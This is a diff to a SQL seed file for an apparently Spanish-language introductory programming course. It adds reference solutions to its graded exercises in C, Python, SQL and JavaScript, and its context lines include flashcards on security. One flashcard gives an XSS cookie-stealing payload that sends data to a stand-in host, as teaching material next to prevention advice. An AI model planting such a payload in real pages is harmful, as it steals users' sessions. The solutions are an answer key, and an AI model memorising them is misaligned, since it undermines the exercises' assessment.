@@ -1288,3 +1288,339 @@ INSERT INTO flashcards (id, week, question, answer, order_index) VALUES
 ('fc-11-7', 11, '¿Qué es XSS (Cross-Site Scripting) y cómo se previene?', 'XSS ocurre cuando un atacante inyecta JavaScript malicioso en una página web que otros usuarios ven. Si la app guarda input del usuario (comentarios, nombres) y lo renderiza sin sanitizar, el JS del atacante corre en el navegador de la víctima con acceso a sus cookies y sesión. Ejemplo: guardar `<script>fetch("evil.com?c="+document.cookie)</script>` como nombre de usuario. **Prevención**: (1) **escapar** el output HTML (`&lt;` en vez de `<`); (2) usar frameworks modernos (React, Vue) que escapan por defecto; (3) nunca usar `innerHTML` con datos del usuario; (4) Content Security Policy (CSP) como defensa en profundidad.', 7),
 ('fc-11-8', 11, '¿Qué es la ingeniería social y por qué es el vector de ataque más efectivo?', 'La **ingeniería social** explota psicología humana en vez de vulnerabilidades técnicas. El **phishing** es su forma más común: un correo, SMS o llamada que suplanta a una entidad confiable (banco, jefe, soporte técnico) para que la víctima entregue credenciales o instale malware. Es el vector más efectivo porque pasa por alto toda la seguridad técnica — si tú entregas la contraseña, no hay defensa tecnológica posible. Señales de phishing: urgencia artificial, URLs con ligeras variaciones (paypa1.com), solicitudes de datos que una empresa legítima nunca pediría por email.', 8)
 ON CONFLICT(id) DO NOTHING;
+
+-- =============================================================
+-- SOLUTIONS (reference implementations for all 22 problems)
+-- =============================================================
+
+INSERT INTO solutions (problem_id, code, language) VALUES
+
+-- Semana 0
+('p-binary-py',
+'n = int(input())
+if n == 0:
+    print(0)
+else:
+    bits = []
+    while n > 0:
+        bits.append(n % 2)
+        n //= 2
+    print("".join(str(b) for b in reversed(bits)))',
+'python'),
+
+-- Semana 1
+('p-cash-c',
+'#include <stdio.h>
+int main(void)
+{
+    int cents;
+    scanf("%d", &cents);
+    int coins = 0;
+    coins += cents / 25; cents %= 25;
+    coins += cents / 10; cents %= 10;
+    coins += cents / 5;  cents %= 5;
+    coins += cents;
+    printf("%d\n", coins);
+}',
+'c'),
+
+('p-credit-c',
+'#include <stdio.h>
+int main(void)
+{
+    long n;
+    scanf("%ld", &n);
+    long tmp = n;
+    int sum = 0, len = 0;
+    while (tmp > 0) {
+        int d = tmp % 10;
+        if (len % 2 == 1) { d *= 2; if (d > 9) d -= 9; }
+        sum += d;
+        tmp /= 10;
+        len++;
+    }
+    if (sum % 10 != 0) { printf("INVALID\n"); return 0; }
+    long f2 = n; while (f2 >= 100) f2 /= 10;
+    long f1 = f2 / 10;
+    if (len == 15 && (f2 == 34 || f2 == 37))        printf("AMEX\n");
+    else if (len == 16 && f2 >= 51 && f2 <= 55)     printf("MASTERCARD\n");
+    else if ((len == 13 || len == 16) && f1 == 4)   printf("VISA\n");
+    else                                             printf("INVALID\n");
+}',
+'c'),
+
+('p-mario-c',
+'#include <stdio.h>
+int main(void)
+{
+    int h;
+    do { scanf("%d", &h); } while (h < 1 || h > 8);
+    for (int i = 1; i <= h; i++) {
+        for (int j = 0; j < h - i; j++) printf(" ");
+        for (int k = 0; k < i; k++)     printf("#");
+        printf("\n");
+    }
+}',
+'c'),
+
+('p-population-c',
+'#include <stdio.h>
+int main(void)
+{
+    int start, end;
+    scanf("%d", &start);
+    scanf("%d", &end);
+    int years = 0;
+    while (start < end) {
+        start += start / 3 - start / 4;
+        years++;
+    }
+    printf("%d\n", years);
+}',
+'c'),
+
+-- Semana 2
+('p-caesar-c',
+'#include <stdio.h>
+#include <string.h>
+#include <ctype.h>
+int main(void)
+{
+    int k;
+    scanf("%d\n", &k);
+    char line[4096];
+    fgets(line, sizeof(line), stdin);
+    int n = strlen(line);
+    if (n > 0 && line[n-1] == ''\n'') line[n-1] = ''\0'';
+    for (int i = 0; line[i]; i++) {
+        if (isalpha(line[i])) {
+            char base = isupper(line[i]) ? ''A'' : ''a'';
+            printf("%c", (char)((line[i] - base + k) % 26 + base));
+        } else {
+            printf("%c", line[i]);
+        }
+    }
+    printf("\n");
+}',
+'c'),
+
+('p-readability-c',
+'#include <stdio.h>
+#include <string.h>
+#include <ctype.h>
+int main(void)
+{
+    char text[65536];
+    fgets(text, sizeof(text), stdin);
+    int letters = 0, words = 1, sentences = 0;
+    for (int i = 0; text[i] && text[i] != ''\n''; i++) {
+        if (isalpha(text[i]))                          letters++;
+        else if (text[i] == '' '')                     words++;
+        else if (text[i] == ''.'' || text[i] == ''!'' || text[i] == ''?'') sentences++;
+    }
+    double L = (double)letters / words * 100;
+    double S = (double)sentences / words * 100;
+    int grade = (int)(0.0588 * L - 0.296 * S - 15.8 + 0.5);
+    if (grade < 1)       printf("Before Grade 1\n");
+    else if (grade >= 16) printf("Grade 16+\n");
+    else                  printf("Grade %d\n", grade);
+}',
+'c'),
+
+('p-scrabble-c',
+'#include <stdio.h>
+#include <string.h>
+#include <ctype.h>
+int pts[] = {1,3,3,2,1,4,2,4,1,8,5,1,3,1,1,3,10,1,1,1,1,4,4,8,4,10};
+int score(char *w) {
+    int s = 0;
+    for (int i = 0; w[i]; i++)
+        if (isalpha(w[i])) s += pts[toupper(w[i]) - ''A''];
+    return s;
+}
+int main(void)
+{
+    char w1[128], w2[128];
+    scanf("%s\n%s", w1, w2);
+    int s1 = score(w1), s2 = score(w2);
+    if (s1 > s2)      printf("Player 1 wins!\n");
+    else if (s2 > s1) printf("Player 2 wins!\n");
+    else              printf("Tie!\n");
+}',
+'c'),
+
+-- Semana 3
+('p-plurality-c',
+'#include <stdio.h>
+#include <string.h>
+#define MAX 10
+int main(void)
+{
+    int n;
+    scanf("%d\n", &n);
+    char names[MAX][64];
+    int votes[MAX] = {0};
+    char line[256];
+    fgets(line, sizeof(line), stdin);
+    char *tok = strtok(line, " \n");
+    for (int i = 0; i < n && tok; i++, tok = strtok(NULL, " \n"))
+        strncpy(names[i], tok, 63);
+    char vote[64];
+    while (fgets(vote, sizeof(vote), stdin)) {
+        int len = strlen(vote);
+        if (len > 0 && vote[len-1] == ''\n'') vote[len-1] = ''\0'';
+        if (strlen(vote) == 0) break;
+        for (int i = 0; i < n; i++)
+            if (strcmp(vote, names[i]) == 0) { votes[i]++; break; }
+    }
+    int mx = 0;
+    for (int i = 0; i < n; i++) if (votes[i] > mx) mx = votes[i];
+    for (int i = 0; i < n; i++) if (votes[i] == mx) printf("%s\n", names[i]);
+}',
+'c'),
+
+-- Semana 4
+('p-volume-c',
+'#include <stdio.h>
+int main(void)
+{
+    double factor;
+    scanf("%lf\n", &factor);
+    int sample;
+    while (scanf("%d", &sample) == 1)
+        printf("%d\n", (int)(sample * factor));
+}',
+'c'),
+
+-- Semana 5
+('p-inheritance-c',
+'#include <stdio.h>
+#include <stdlib.h>
+typedef struct person { struct person *parents[2]; char alleles[2]; } person;
+const char ALLELES[] = {''A'', ''B'', ''O''};
+person *create_family(int g) {
+    person *p = malloc(sizeof(person));
+    if (g > 1) {
+        p->parents[0] = create_family(g - 1);
+        p->parents[1] = create_family(g - 1);
+        p->alleles[0] = p->parents[0]->alleles[rand() % 2];
+        p->alleles[1] = p->parents[1]->alleles[rand() % 2];
+    } else {
+        p->parents[0] = p->parents[1] = NULL;
+        p->alleles[0] = ALLELES[rand() % 3];
+        p->alleles[1] = ALLELES[rand() % 3];
+    }
+    return p;
+}
+void print_family(person *p, int gen) {
+    if (!p) return;
+    for (int i = 0; i < gen * 4; i++) printf(" ");
+    const char *label = gen == 0 ? "Child" : gen == 1 ? "Parent" : "Grandparent";
+    printf("%s (blood type: %c%c):\n", label, p->alleles[0], p->alleles[1]);
+    print_family(p->parents[0], gen + 1);
+    print_family(p->parents[1], gen + 1);
+}
+void free_family(person *p) {
+    if (!p) return;
+    free_family(p->parents[0]); free_family(p->parents[1]); free(p);
+}
+int main(void)
+{
+    int generations, seed;
+    scanf("%d %d", &generations, &seed);
+    srand(seed);
+    person *p = create_family(generations);
+    print_family(p, 0);
+    free_family(p);
+}',
+'c'),
+
+-- Semana 6 Python
+('p-cash-py',
+'cents = int(input())
+coins = 0
+coins += cents // 25; cents %= 25
+coins += cents // 10; cents %= 10
+coins += cents // 5;  cents %= 5
+coins += cents
+print(coins)',
+'python'),
+
+('p-mario-py',
+'h = int(input())
+for i in range(1, h + 1):
+    print(" " * (h - i) + "#" * i)',
+'python'),
+
+-- Semana 7 SQL
+('p-songs-sql',
+'SELECT name FROM songs WHERE energy > 0.6 ORDER BY name;',
+'sql'),
+
+('p-artists-sql',
+'SELECT s.name, a.name FROM songs s JOIN artists a ON s.artist_id = a.id ORDER BY a.name, s.name;',
+'sql'),
+
+('p-counts-sql',
+'SELECT a.name, COUNT(*) FROM artists a JOIN songs s ON s.artist_id = a.id GROUP BY a.id ORDER BY COUNT(*) DESC, a.name;',
+'sql'),
+
+-- Semana 8 JavaScript
+('p-greet-js',
+'const lines = require("fs").readFileSync("/dev/stdin", "utf8").trim().split("\n");
+console.log(`hello, ${lines[0]}`);',
+'javascript'),
+
+('p-tally-js',
+'const lines = require("fs").readFileSync("/dev/stdin", "utf8").trim().split("\n");
+const counts = {};
+for (const line of lines) counts[line] = (counts[line] || 0) + 1;
+const sorted = Object.entries(counts).sort((a, b) => b[1] - a[1] || a[0].localeCompare(b[0]));
+for (const [word, count] of sorted) console.log(`${word}: ${count}`);',
+'javascript'),
+
+('p-json-js',
+'const line = require("fs").readFileSync("/dev/stdin", "utf8").trim();
+const obj = JSON.parse(line);
+console.log(`Nombre: ${obj.name}`);
+console.log(`Edad: ${obj.age}`);
+console.log(`Ciudad: ${obj.city}`);',
+'javascript'),
+
+-- Semana 9 Python
+('p-freq-py',
+'from collections import Counter
+import sys
+words = sys.stdin.read().split()
+freq = Counter(words)
+for word, count in sorted(freq.items()):
+    print(f"{word}: {count}")',
+'python'),
+
+('p-csv-py',
+'import sys
+rows = []
+for line in sys.stdin:
+    line = line.strip()
+    if not line:
+        continue
+    parts = line.split(",")
+    if int(parts[1]) > 25:
+        rows.append(parts)
+rows.sort(key=lambda r: r[0])
+for r in rows:
+    print(",".join(r))',
+'python'),
+
+('p-template-py',
+'import sys
+lines = sys.stdin.read().splitlines()
+template = lines[0]
+for line in lines[1:]:
+    if "=" in line:
+        key, value = line.split("=", 1)
+        template = template.replace("{{" + key + "}}", value)
+print(template)',
+'python')
+
+ON CONFLICT(problem_id) DO NOTHING;
